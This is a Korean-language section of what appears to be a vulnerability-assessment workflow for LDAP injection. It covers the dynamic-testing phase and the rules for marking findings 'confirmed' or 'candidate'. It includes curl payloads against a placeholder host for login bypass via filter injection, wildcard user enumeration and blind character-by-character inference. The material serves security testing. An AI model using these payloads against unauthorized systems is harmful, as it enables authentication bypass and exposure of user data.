### Phase 2: 동적 테스트 (검증)

Phase 1 소스코드 분석이 완료되면 후보 목록을 사용자에게 보여준다. 후보가 존재하는 경우에만 동적 테스트를 진행한다. 후보가 0건이면 동적 테스트 없이 바로 보고서를 작성한다.

**동적 테스트 정보 획득:**

사용자에게는 테스트 대상 도메인(Host)과 직접 획득이 불가능한 정보(외부 콜백 서비스 URL, 프로덕션 전용 자격 증명 등)만 요청한다. 그 외의 정보는 소스코드 분석 또는 관련 엔드포인트에 직접 HTTP 요청을 보내 획득한다.

사용자가 동적 테스트를 원하지 않거나 정보를 제공하지 않으면, 소스코드 분석 결과의 모든 후보를 "후보"로 유지한 채 Phase 3으로 진행한다.

**인증 우회 테스트:**
```
# 와일드카드로 패스워드 조건 무효화
curl -X POST "https://target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin)(|(uid=*","password":"anything"}'

# 또는 URL-encoded
curl -X POST "https://target.com/login" \
  -d "username=admin%29%28%7C%28uid%3D%2A&password=anything"

# 와일드카드 패스워드
curl -X POST "https://target.com/login" \
  -d "username=admin&password=*"
```

**정보 유출 테스트:**
```
# 모든 사용자 조회: * 와일드카드
curl "https://target.com/api/users/search?q=*"

# OR 조건 삽입
curl "https://target.com/api/users/search?q=admin)(|(uid=*)"
```

**Blind LDAP Injection 테스트:**
```
# 첫 글자 추론: a* vs b* (응답 차이 비교)
curl -X POST "https://target.com/login" -d "username=a*&password=*"
curl -X POST "https://target.com/login" -d "username=b*&password=*"
```

**검증 기준:**
- **확인됨**: 동적 테스트로 LDAP 필터 조작을 통해 인증 우회나 의도하지 않은 데이터 반환이 확인됨
- **후보**: 동적 테스트를 수행하지 않았거나, 동적 테스트로 확인이 불가하여 수동 확인이 필요한 경우
- **"확인됨"은 동적 테스트를 통해서만 부여할 수 있다**: 소스코드 분석만으로는 아무리 취약해 보여도 "확인됨"으로 보고하지 않는다. 동적 테스트로 실제 트리거를 확인한 경우에만 "확인됨"이다. 동적 테스트를 수행하지 않았으면 모든 결과는 "후보"이다.
- **보고서 제외**: 동적 테스트 결과 취약하지 않은 것으로 확인된 경우는 보고서에 포함하지 않는다
